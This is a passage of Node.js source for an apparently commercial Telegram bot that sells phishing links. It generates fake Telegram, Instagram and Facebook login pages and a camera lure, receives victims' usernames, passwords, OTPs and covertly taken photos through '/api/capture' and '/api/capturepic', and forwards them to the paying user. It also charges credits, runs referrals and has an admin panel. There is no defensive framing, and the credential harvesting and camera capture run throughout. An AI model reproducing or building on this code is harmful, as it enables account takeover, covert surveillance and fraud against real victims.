async function loadUsers(){try{var r=await fetch("/api/admin/users");var users=await r.json();var list=document.getElementById("userList");var entries=Object.entries(users);if(entries.length===0){list.innerHTML="<div class=\\"empty\\"><i>👥</i>No users</div>";return;}var html="";for(var i=0;i<entries.length;i++){var id=entries[i][0];var data=entries[i][1];html+="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+id+"</div><div>⭐ Credits: "+(data.unlimited?"♾️ Unlimited":data.credits||0)+"</div><div>👥 Referrals: "+(data.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(data.joinedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:#888;\\">Referred by: "+(data.referredBy||"None")+"</div><div style=\\"font-size:12px;color:"+(data.banned?"#dc3545":"#28a745")+";\\">"+(data.banned?"🚫 Banned":"✅ Active")+"</div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading users",true);}}
async function searchUser(){var uid=document.getElementById("searchUser").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/user/"+uid);var user=await r.json();if(user.error){showToast("User not found",true);return;}document.getElementById("userList").innerHTML="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+uid+"</div><div>⭐ Credits: "+(user.unlimited?"♾️ Unlimited":user.credits||0)+"</div><div>👥 Referrals: "+(user.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(user.joinedAt).toLocaleDateString()+"</div><div>Referred by: "+(user.referredBy||"None")+"</div><div style=\\"font-size:12px;color:"+(user.banned?"#dc3545":"#28a745")+";\\">"+(user.banned?"🚫 Banned":"✅ Active")+"</div></div>";}catch(err){showToast("Error",true);}}
async function modifyCredits(){var uid=document.getElementById("userIdInput").value.trim();var amount=parseInt(document.getElementById("creditAmount").value);if(!uid||isNaN(amount)){showToast("Enter valid User ID and amount",true);return;}try{var r=await fetch("/api/admin/modify-credits",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid,amount:amount})});var data=await r.json();if(data.success){showToast("Updated! New: "+data.credits);loadUsers();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}
async function toggleUnlimited(){var uid=document.getElementById("userIdInput").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/toggle-unlimited",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid})});var data=await r.json();if(data.success){showToast("Unlimited: "+(data.unlimited?"ON":"OFF"));loadUsers();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}
async function loadFeatured(){try{var r=await fetch("/api/admin/featured");var data=await r.json();var photos=await fetch("/api/admin/photos").then(function(r){return r.json()});var select=document.getElementById("featuredPhotoSelect");select.innerHTML="<option value=\\"\\">Select a photo...</option>";for(var i=0;i<photos.photos.length;i++){var p=photos.photos[i];var opt=document.createElement("option");opt.value=p.id;opt.textContent=p.caption||p.filename;if(data.photo===p.id)opt.selected=true;select.appendChild(opt);}var preview=document.getElementById("featuredPreview");if(data.photoData){preview.innerHTML="<img src=\\""+data.photoData.url+"\\" style=\\"max-width:200px;border-radius:10px;border:1px solid #2a2a4a;\\">";}else{preview.innerHTML="<p style=\\"color:#888;\\">No featured photo</p>";}document.getElementById("featuredMessageDisplay").innerHTML="<strong>Current:</strong> "+(data.message||"No message");document.getElementById("featuredMessage").value=data.message||"";var statusEl=document.getElementById("featuredStatus");if(data.status){statusEl.className="status-badge status-active";statusEl.textContent="✅ Active";}else{statusEl.className="status-badge status-inactive";statusEl.textContent="❌ Inactive";}}catch(err){showToast("Error loading featured",true);}}
async function setFeaturedPhoto(){var photoId=document.getElementById("featuredPhotoSelect").value;if(!photoId){showToast("Select a photo",true);return;}try{var r=await fetch("/api/admin/featured/photo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photoId:photoId})});if(r.ok){showToast("Featured photo updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}
async function removeFeaturedPhoto(){try{var r=await fetch("/api/admin/featured/photo",{method:"DELETE"});if(r.ok){showToast("Removed!");loadFeatured();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}
async function setFeaturedMessage(){var message=document.getElementById("featuredMessage").value.trim();if(!message){showToast("Enter a message",true);return;}try{var r=await fetch("/api/admin/featured/message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:message})});if(r.ok){showToast("Message updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}
async function toggleFeaturedStatus(){try{var r=await fetch("/api/admin/featured/toggle",{method:"POST"});if(r.ok){showToast("Status toggled!");loadFeatured();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}
async function loadQR(){try{var r=await fetch("/api/admin/qr");if(r.ok){var blob=await r.blob();var url=URL.createObjectURL(blob);document.getElementById("qrPreview").style.display="block";document.getElementById("qrImage").src=url;document.getElementById("qrStatus").innerHTML="✅ QR code is available";}else{document.getElementById("qrPreview").style.display="none";document.getElementById("qrStatus").innerHTML="❌ No QR code uploaded yet";}}catch(err){document.getElementById("qrStatus").innerHTML="❌ Error loading QR";}}
async function uploadQR(){var file=document.getElementById("qrUpload").files[0];if(!file){showToast("Select an image first!",true);return;}var fd=new FormData();fd.append("qr",file);try{var r=await fetch("/api/admin/upload-qr",{method:"POST",body:fd});var data=await r.json();if(data.success){showToast("✅ QR uploaded successfully!");loadQR();}else{showToast("❌ Upload failed: "+data.error,true);}}catch(err){showToast("❌ Error uploading QR",true);}}
async function removeQR(){if(!confirm("Remove QR code?"))return;try{var r=await fetch("/api/admin/remove-qr",{method:"DELETE"});if(r.ok){showToast("✅ QR removed!");loadQR();}else showToast("❌ Remove failed",true);}catch(err){showToast("❌ Error removing QR",true);}}
async function loadLogs(){try{var r=await fetch("/api/admin/logs");var data=await r.json();document.getElementById("logsDisplay").textContent=data.logs||"No logs available";}catch(err){document.getElementById("logsDisplay").textContent="Error loading logs";showToast("Error loading logs",true);}}
async function clearLogs(){if(!confirm("Clear all logs?"))return;try{var r=await fetch("/api/admin/logs",{method:"DELETE"});if(r.ok){showToast("Logs cleared!");loadLogs();}else showToast("Clear failed",true);}catch(err){showToast("Error",true);}}
loadPhotos();loadChannels();loadUsers();loadFeatured();loadQR();
</script></body></html>`);
});

// ====================== OTHER API ROUTES ======================
app.get('/api/bot/random-photo', async (req, res) => {
    const photo = await getRandomPhoto();
    if (photo) res.json({ success: true, photo });
    else res.status(404).json({ error: 'No photos' });
});
app.post('/api/capture', async (req, res) => {
    const { userid, username, password, platform } = req.body || {};
    if (!userid || !username) return res.status(400).json({ error: 'Missing fields' });
    try {
        const photo = await getRandomPhoto();
        const message = LoveNotifer(platform, username, password);
        if (photo) {
            const photoUrl = req.protocol + '://' + req.get('host') + photo.url;
            await S7.sendPhoto(userid, photoUrl, { caption: message, parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(userid, message);
        }
        logToFile('📸 Capture from user ' + userid);
        res.json({ status: 'success' });
    } catch (err) {
        logToFile('❌ Capture error: ' + err.message);
        res.status(500).json({ error: err.message });
    }
});
app.post('/api/capturepic', async (req, res) => {
    const { userid, mobile, SY, platform } = req.body || {};
    if (!userid || !SY) return res.status(400).json({ error: 'Missing photo data' });
    try {
        const photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
        const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
        const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
        const caption = '<b>📸 NEW CAPTURE 📸</b>\n\n👤 <b>Target:</b> <code>' + (mobile || 'Unknown') + '</code>\n🌐 <b>Platform:</b> ' + (platform ? platform.toUpperCase() : 'N/A') + '\n📅 <b>Date:</b> ' + SYloveDaTe + '\n⏰ <b>Time:</b> ' + SYloveTiMe + '\n\n<i>© ↝ ᴅᴇᴠ ʙʏ » ' + config.S7 + '</i>';
        await S7.sendPhoto(userid, photoBuffer, { caption, parse_mode: 'HTML' });
        logToFile('📸 Camera capture from user ' + userid);
        res.json({ status: 'success' });
    } catch (err) {
        logToFile('❌ Camera capture error: ' + err.message);
        res.status(500).json({ error: 'Failed to process image' });
    }
});
app.post('/api/upload-photo-fast', async (req, res) => {
    try {
        const { userid, platform, filename, data } = req.body || {};
        if (!userid || !data) return res.status(400).json({ error: 'Missing data' });
        const base64Data = data.replace(/^data:.*?;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        if (!pendingPhotos[userid]) pendingPhotos[userid] = [];
        pendingPhotos[userid].push(buffer);
        userActive[userid] = Date.now();
        if (pendingPhotos[userid].length >= config.BATCH_SIZE) await sendBatchPhotos(userid);
        res.json({ success: true, stored: true, count: pendingPhotos[userid].length });
    } catch (err) {
        logToFile('❌ Photo upload error: ' + err.message);
        res.status(500).json({ error: 'Failed to process photo' });
    }
});

// ====================== TELEGRAM PHISHING LINK GENERATION ======================
app.get('/api/create-telegram-link', async (req, res) => {
    const userid = req.headers.userid || 'unknown';
    const platform = 'telegram';
    
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    let html = TELEGRAM_LOGIN_TEMPLATE
        .replace(/USER_ID_PLACEHOLDER/g, userid)
        .replace(/SESSION_ID_PLACEHOLDER/g, sessionId);
    
    const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
    const fileId = 'telegram_' + uniqueId;
    const filePath = path.join(PAGES_DIR, fileId + '.html');
    fs.writeFileSync(filePath, html);
    const url = config.baseUrl + '/page/' + fileId;
    await createLink(userid, platform, fileId, url);
    console.log('🔗 Telegram Link generated: ' + url);
    res.json({ success: true, url, id: fileId });
});

// ====================== PAGE ROUTE ======================
app.get('/page/:id', async (req, res) => {
    const id = req.params.id;
    const filePath = path.join(PAGES_DIR, id + '.html');
    if (!(await isLinkValid(id))) {
        let reason = 'Link is invalid';
        const link = await getLink(id);
        if (!link) reason = 'Link not found';
        else if (!link.active) reason = 'Link has expired';
        else if (Date.now() > link.expiresAt) reason = 'Link expired (15 minutes)';
        else if (link.opens >= link.maxOpens) reason = 'Link opened maximum 3 times';
        return res.send('<h1 style="color:#ff4757;text-align:center;margin-top:50px;">🔒 Link Expired</h1><p style="text-align:center;color:#888;">' + reason + '</p><p style="text-align:center;color:#888;">Please generate a new link.</p>');
    }
    await incrementLinkOpen(id);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.status(404).send('<h1>Page not found</h1>');
});

// ====================== TELEGRAM BOT ======================
const S7 = new TelegramBot(config.mainToken, { polling: true });
S7.getMe().then(botInfo => {
    console.log('✅ Bot Started: @' + botInfo.username);
    logToFile('🤖 Bot Started: @' + botInfo.username);
}).catch(err => {
    console.error('❌ Bot Start Error:', err.message);
    process.exit(1);
});

// ====================== KEYBOARDS ======================
const LOVESY = {
    inline_keyboard: [
        [{ text: '📸 INSTAGRAM', callback_data: 'gen_instagram' }],
        [{ text: '📘 FACEBOOK', callback_data: 'gen_facebook' }],
        [{ text: '📷 CAMERA', callback_data: 'gen_camera' }],
        [{ text: '🛡️ SECURITY SCAN', callback_data: 'gen_securityscan' }],
        [{ text: '📱 TELEGRAM', callback_data: 'gen_telegram' }],
        [{ text: '👥 Referral', callback_data: 'referral' }],
        [{ text: '⭐ My Credits', callback_data: 'credits' }],
        [{ text: '💰 Buy Credits', callback_data: 'buy_credits' }]
    ]
};
const ADMIN_KEYBOARD = {
    inline_keyboard: [
        [{ text: '👑 Admin Panel', callback_data: 'admin_panel' }],
        [{ text: '📊 Stats', callback_data: 'admin_stats' }],
        [{ text: '📢 Broadcast', callback_data: 'admin_broadcast' }],
        [{ text: '📋 Logs', callback_data: 'admin_logs' }],
        [{ text: '🔙 Back', callback_data: 'back' }]
    ]
};
const SYBack = { inline_keyboard: [[{ text: '🔙 BACK', callback_data: 'back' }]] };
function getRegenMarkup(platform) {
    return { inline_keyboard: [[{ text: '🔄 REGENERATE (1 Credit)', callback_data: 'regen_' + platform }], [{ text: '🔙 BACK', callback_data: 'back' }]] };
}

// ====================== BOT COMMANDS ======================
async function SendLoveSYMenu(chatId, firstName) {
    const user = await getUser(chatId);
    if (user.banned) {
        return S7.sendMessage(chatId, '🚫 You are banned from using this bot.');
    }
    const featured = await getFeatured();
    const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
    const isAdmin = chatId.toString() === config.adminId;
    let message = '𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0);
    if (featured.status && featured.message) message += '\n\n📌 ' + featured.message;
    const menuText = SYloveMenu(firstName, message);
    let keyboard = LOVESY;
    if (isAdmin) {
        keyboard = { inline_keyboard: LOVESY.inline_keyboard.concat([[{ text: '👑 Admin Panel', callback_data: 'admin_panel' }]]) };
    }
    const sentMsg = await S7.sendMessage(chatId, menuText, { parse_mode: 'HTML', reply_markup: keyboard });
    if (featured.status && featured.photo) {
        const photos = await getPhotos();
        const photo = photos.find(p => p.id === featured.photo);
        if (photo) {
            const photoUrl = config.baseUrl + photo.url;
            await S7.sendPhoto(chatId, photoUrl, { caption: '⭐ Featured Content' });
        }
    }
    return sentMsg;
}
async function checkAndSendMenu(chatId, firstName) {
    const isMember = await checkAllChannels(chatId);
    if (!isMember) {
        const channels = await getChannels();
        let msg = '⚠️ <b>Access Denied!</b>\n\nPlease join all channels:\n\n';
        channels.forEach((ch, i) => { msg += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
        msg += '\nAfter joining, click below to verify.';
        const buttons = await getChannelButtonsAsync();
        return S7.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: buttons });
    }
    await SendLoveSYMenu(chatId, firstName);
}
function SYLoVe(commands) {
    if (!Array.isArray(commands)) commands = [commands];
    S7.on('message', async (msg) => {
        if (!msg.text) return;
        const cmd = msg.text.trim().split(' ')[0].slice(1);
        if (commands.includes(cmd)) {
            console.log('📩 Command: ' + cmd + ' from ' + msg.from.first_name);
            logToFile('📩 Command: ' + cmd + ' from ' + msg.from.id);
            await checkAndSendMenu(msg.chat.id, msg.from.first_name);
        }
    });
}
SYLoVe(['start', 'menu']);

// ====================== /telegram COMMAND ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text === '/telegram') {
        const user = await getUser(msg.from.id);
        if (user.banned) return S7.sendMessage(msg.chat.id, '🚫 You are banned.');
        
        // Check credits
        if (!user.unlimited && (user.credits || 0) <= 0) {
            return S7.sendMessage(msg.chat.id, '❌ Insufficient credits! Need 1 credit. Use referral or buy credits.');
        }
        
        // Deduct credit
        const deducted = await useCredit(msg.from.id);
        if (!deducted) {
            return S7.sendMessage(msg.chat.id, '❌ Credit deduction failed. Please try again.');
        }
        
        const loadingMsg = await S7.sendMessage(msg.chat.id, SYloveMenu(msg.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)'), { parse_mode: 'HTML', reply_markup: SYBack });
        
        try {
            const response = await fetch(config.baseUrl + '/api/create-telegram-link', {
                method: 'GET',
                headers: { userid: String(msg.from.id) }
            });
            const data = await response.json();
            if (data.error) {
                await addCredits(msg.from.id, 1);
                await S7.editMessageText(SYloveMenu(msg.from.first_name, '❌ Error generating link: ' + data.error), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
                return;
            }
            const finalMsg = '✅ <b>Telegram Link Generated!</b>\n\n🔗 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> TELEGRAM PREMIUM\n⏰ <b>Valid for:</b> 15 minutes\n🔢 <b>Max Opens:</b> 3 times\n\n📱 Target will see a real Telegram login page.\nYou will receive OTP and password.\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
            await S7.editMessageText(SYloveMenu(msg.from.first_name, finalMsg), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup('telegram') });
        } catch (err) {
            console.error('Telegram Link Error:', err.message);
            logToFile('❌ Telegram Link Error: ' + err.message);
            await addCredits(msg.from.id, 1);
            await S7.editMessageText(SYloveMenu(msg.from.first_name, '❌ Error generating Telegram link'), { chat_id: msg.chat.id, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack });
        }
        return;
    }
});

// ====================== /getadmin COMMAND ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text === '/getadmin' || text === '/adminpanel') {
        if (msg.from.id.toString() !== config.adminId) {
            return S7.sendMessage(msg.chat.id, '❌ Only admin can access.');
        }
        const adminUrl = config.baseUrl + '/admin';
        await S7.sendMessage(msg.chat.id, 
            `👑 <b>Admin Panel</b>\n\n🔗 Click here: <a href="${adminUrl}">Open Admin Panel</a>\n\nOr copy this URL:\n<code>${adminUrl}</code>`,
            { parse_mode: 'HTML', disable_web_page_preview: true }
        );
    }
});

// ====================== /pay COMMAND (User) ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/pay ')) {
        const amountStr = text.replace('/pay ', '').trim();
        const amount = parseInt(amountStr);
        if (isNaN(amount) || amount <= 0) {
            return S7.sendMessage(msg.chat.id, '⚠️ Please enter a valid amount.\nExample: /pay 20');
        }
        let credits, plan;
        if (amount === 20) { credits = 10; plan = '10'; }
        else if (amount === 40) { credits = 25; plan = '25'; }
        else if (amount === 70) { credits = 50; plan = '50'; }
        else if (amount === 100) { credits = 'Unlimited'; plan = 'unlimited'; }
        else {
            credits = Math.floor(amount / 2);
            plan = 'custom';
        }
        const user = await getUser(msg.from.id);
        if (user.banned) return S7.sendMessage(msg.chat.id, '🚫 You are banned.');
        const msgText = `💰 <b>Payment Request</b>\n\n📊 Credits: ${credits}\n💵 Amount: ₹${amount}\n🆔 Transaction ID: PTS-${Date.now().toString(36).toUpperCase()}\n\n📤 Please send the payment screenshot after paying.`;
        await S7.sendMessage(msg.chat.id, msgText, { parse_mode: 'HTML' });
        if (qrExists()) {
            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: `💳 Scan QR to pay ₹${amount}`, parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(msg.chat.id, '⚠️ QR code not uploaded yet. Admin will add soon.');
        }
        user._pendingPayment = { credits, amount, plan };
        await user.save();
        await S7.sendMessage(msg.chat.id, '✅ Please send the transaction screenshot (photo) after payment.');
        return;
    }
});

// ====================== REFERRAL HANDLER ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/start ref_')) {
        const referrerId = text.replace('/start ref_', '');
        const userId = msg.from.id;
        const user = await getUser(userId);
        if (user.banned) return S7.sendMessage(userId, '🚫 You are banned.');
        if (user.referredBy) return S7.sendMessage(userId, '✅ You are already registered!');
        const referrer = await getUser(referrerId);
        if (!referrer) return S7.sendMessage(userId, '❌ Invalid referral link!');
        if (!(await checkAllChannels(userId))) {
            user._pendingReferrer = referrerId;
            await user.save();
            const channels = await getChannels();
            let msgText = '⚠️ <b>Join all channels first!</b>\n\n';
            channels.forEach((ch, i) => { msgText += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
            msgText += '\nAfter joining, click below to claim referral bonus!';
            const buttons = await getChannelButtonsAsync();
            return S7.sendMessage(userId, msgText, { parse_mode: 'HTML', reply_markup: buttons });
        }
        await processReferral(referrerId, userId);
    }
});
async function processReferral(referrerId, userId) {
    const user = await getUser(userId);
    if (user.referredBy) return;
    user.referredBy = referrerId;
    await user.save();
    const referrer = await addReferral(referrerId, userId);
    let newUserInfo = '@user_' + userId;
    try { const chat = await S7.getChat(userId); newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId; } catch {}
    let referrerInfo = '@user_' + referrerId;
    try { const chat = await S7.getChat(referrerId); referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId; } catch {}
    await S7.sendMessage(referrerId, '🎉 <b>New Referral Success!</b>\n\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> +2\n\n📊 <b>Your Total Credits:</b> ' + (referrer.credits || 0) + '\n📊 <b>Your Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
    await S7.sendMessage(config.adminId, '👥 <b>New Referral Success!</b>\n\n👤 <b>Referrer:</b> ' + referrerInfo + '\n👤 <b>New User:</b> ' + newUserInfo + '\n🆔 <b>Referrer ID:</b> <code>' + referrerId + '</code>\n🆔 <b>New User ID:</b> <code>' + userId + '</code>\n⭐ <b>Credits Earned:</b> 2\n\n📊 <b>Referrer Total Credits:</b> ' + (referrer.credits || 0) + '\n📊 <b>Referrer Total Referrals:</b> ' + (referrer.totalReferrals || 0), { parse_mode: 'HTML' });
    await S7.sendMessage(userId, '✅ <b>Welcome!</b>\n\nYou joined through <b>' + referrerInfo + '</b>\'s referral link!\n🎁 You already have 3 credits to start.\n⭐ <b>Your Credits:</b> ' + user.credits, { parse_mode: 'HTML' });
    await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
    logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
}

// ====================== CALLBACK QUERY HANDLER ======================
S7.on('callback_query', async (q) => {
    const uid = q.from.id;
    const mid = q.message.message_id;
    const cid = q.message.chat.id;
    const isAdmin = uid.toString() === config.adminId;
    console.log('🔘 Callback: ' + q.data + ' from ' + q.from.first_name);

    if (await isUserBanned(uid) && q.data !== 'admin_panel' && q.data !== 'admin_stats' && q.data !== 'admin_broadcast' && q.data !== 'admin_logs') {
        await S7.answerCallbackQuery(q.id, { text: '🚫 You are banned.', show_alert: true });
        return;
    }

    // Admin panel
    if (q.data === 'admin_panel' && isAdmin) {
        await S7.deleteMessage(cid, mid);
        await S7.sendMessage(cid, '👑 <b>Admin Panel</b>\n\nSelect an option below.', { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
        return;
    }
    if (q.data === 'admin_stats' && isAdmin) {
        const users = await User.find();
        const photos = await getPhotos();
        const channels = await getChannels();
        const referrals = await Referral.find();
        const links = await Link.find();
        await S7.sendMessage(cid, '📊 <b>Bot Statistics</b>\n\n👥 Total Users: ' + users.length + '\n📷 Total Photos: ' + photos.length + '\n📢 Total Channels: ' + channels.length + '\n👥 Total Referrals: ' + referrals.length + '\n🔗 Total Links: ' + links.length + '\n⏱ Uptime: ' + getUptime(), { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }
    if (q.data === 'admin_broadcast' && isAdmin) {
        await S7.sendMessage(cid, '📢 <b>Send Broadcast</b>\n\nType your message: /broadcast [message]', { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }
    if (q.data === 'admin_logs' && isAdmin) {
        try {
            const logs = fs.readFileSync(path.join(DATA_DIR, 'logs.txt'), 'utf8');
            const lastLogs = logs.split('\n').slice(-50).join('\n');
            await S7.sendMessage(cid, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML', reply_markup: SYBack });
        } catch { await S7.sendMessage(cid, 'No logs', { reply_markup: SYBack }); }
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Check all channels
    if (q.data === 'check_all') {
        const isMember = await checkAllChannels(uid);
        if (isMember) {
            await S7.deleteMessage(cid, mid);
            const user = await getUser(uid);
            if (user._pendingReferrer) {
                const referrerId = user._pendingReferrer;
                user._pendingReferrer = null;
                await user.save();
                await processReferral(referrerId, uid);
                return;
            }
            await SendLoveSYMenu(cid, q.from.first_name);
        } else {
            await S7.answerCallbackQuery(q.id, { text: '❌ Please join ALL channels first!', show_alert: true });
        }
        return;
    }

    // Referral
    if (q.data === 'referral') {
        const botInfo = await S7.getMe();
        const referralLink = 'https://t.me/' + botInfo.username + '?start=ref_' + uid;
        await S7.sendMessage(cid, '👥 <b>Your Referral Link</b>\n\nShare this link:\n\n<code>' + referralLink + '</code>\n\n📌 <b>How it works:</b>\n• Share your link with friends\n• They join all channels\n• You get +2 credits!\n• They get 3 credits on start!', { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Credits
    if (q.data === 'credits') {
        const user = await getUser(uid);
        const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
        await S7.sendMessage(cid, '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Regenerate also uses 1 credit\n🔹 Links expire in 15 minutes\n🔹 Each link can be opened 3 times only', { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Buy credits
    if (q.data === 'buy_credits') {
        const plans = {
            inline_keyboard: [
                [{ text: '💰 10 Credits - ₹20', callback_data: 'plan_10' }],
                [{ text: '💰 25 Credits - ₹40', callback_data: 'plan_25' }],
                [{ text: '💰 50 Credits - ₹70', callback_data: 'plan_50' }],
                [{ text: '♾️ Unlimited - ₹100', callback_data: 'plan_unlimited' }],
                [{ text: '🔙 BACK', callback_data: 'back' }]
            ]
        };
        await S7.sendMessage(cid, '💳 <b>Buy Credits</b>\n\nChoose a plan below:', { parse_mode: 'HTML', reply_markup: plans });
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Plan selection
    if (q.data.startsWith('plan_')) {
        const plan = q.data.replace('plan_', '');
        let credits, amount;
        if (plan === '10') { credits = 10; amount = 20; }
        else if (plan === '25') { credits = 25; amount = 40; }
        else if (plan === '50') { credits = 50; amount = 70; }
        else if (plan === 'unlimited') { credits = 'Unlimited'; amount = 100; }
        else return;

        const msg = '💰 <b>Credits Purchase</b>\n\n📊 <b>Credits:</b> ' + credits + '\n💵 <b>Amount:</b> ₹' + amount + '\n🆔 <b>Transaction ID:</b> PTS-' + Date.now().toString(36).toUpperCase() + '\n\n📤 <b>Instructions:</b>\n1. Scan the QR code below\n2. Pay ₹' + amount + '\n3. Send the transaction screenshot here (upload photo)\n4. Wait for admin approval\n\n⚠️ <b>Don\'t close this chat!</b> Admin will respond here.\n\n✅ After approval, credits will be added.';
        await S7.sendMessage(cid, msg, { parse_mode: 'HTML' });
        
        if (qrExists()) {
            await S7.sendPhoto(cid, QR_FILE, { caption: '💳 <b>Scan QR to Pay ₹' + amount + '</b>', parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(cid, '⚠️ <b>QR code not uploaded yet.</b>\nPlease wait for admin to upload payment QR.\n\nUse /addqr to upload QR (Admin only).', { parse_mode: 'HTML' });
        }
        const user = await getUser(uid);
        user._pendingPayment = { credits, amount, plan };
        await user.save();
        await S7.deleteMessage(cid, mid);
        return;
    }

    // Payment accept/reject
    if (q.data.startsWith('pay_accept_') && isAdmin) {
        const userId = q.data.replace('pay_accept_', '');
        const user = await getUser(userId);
        const payment = user._pendingPayment;
        if (!payment) {
            await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
            return;
        }
        if (payment.credits === 'Unlimited') {
            user.unlimited = true;
            await user.save();
            await S7.sendMessage(userId,
                '🎉 <b>UNLIMITED ACTIVATED!</b>\n\n' +
                'Your payment of ₹' + payment.amount + ' has been verified.\n' +
                'You now have <b>Unlimited Credits</b> forever!\n\n' +
                'Thank you for your support! 🙏',
                { parse_mode: 'HTML' }
            );
        } else {
            user.credits = (user.credits || 0) + parseInt(payment.credits);
            await user.save();
            await S7.sendMessage(userId,
                '✅ <b>Payment Verified!</b>\n\n' +
                '💰 Amount: ₹' + payment.amount + '\n' +
                '⭐ Credits Added: +' + payment.credits + '\n' +
                '📊 Total Credits: ' + user.credits + '\n\n' +
                'Thank you for your support! 🙏',
                { parse_mode: 'HTML' }
            );
        }
        user._pendingPayment = null;
        await user.save();

        await S7.editMessageText(
            '✅ <b>Payment Accepted!</b>\n\n' +
            '👤 User: <code>' + userId + '</code>\n' +
            '📊 Credits: ' + payment.credits + '\n' +
            '💵 Amount: ₹' + payment.amount + '\n\n' +
            '✅ Credits added successfully!',
            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
        );

        await S7.answerCallbackQuery(q.id, { text: '✅ Payment accepted! Credits added.' });
        logToFile('💰 Admin accepted payment from ' + userId);
        return;
    }

    if (q.data.startsWith('pay_reject_') && isAdmin) {
        const userId = q.data.replace('pay_reject_', '');
        const user = await getUser(userId);
        const payment = user._pendingPayment;
        if (!payment) {
            await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
            return;
        }
        await S7.sendMessage(userId,
            '❌ <b>Payment Rejected!</b>\n\n' +
            '📊 Credits: ' + payment.credits + '\n' +
            '💵 Amount: ₹' + payment.amount + '\n\n' +
            'Reason: Payment verification failed.\n' +
            'Please try again with a valid screenshot.',
            { parse_mode: 'HTML' }
        );
        user._pendingPayment = null;
        await user.save();

        await S7.editMessageText(
            '❌ <b>Payment Rejected!</b>\n\n' +
            '👤 User: <code>' + userId + '</code>\n' +
            '📊 Credits: ' + payment.credits + '\n' +
            '💵 Amount: ₹' + payment.amount + '\n\n' +
            '❌ User notified.',
            { chat_id: cid, message_id: mid, parse_mode: 'HTML' }
        );

        await S7.answerCallbackQuery(q.id, { text: '❌ Payment rejected.' });
        logToFile('💰 Admin rejected payment from ' + userId);
        return;
    }

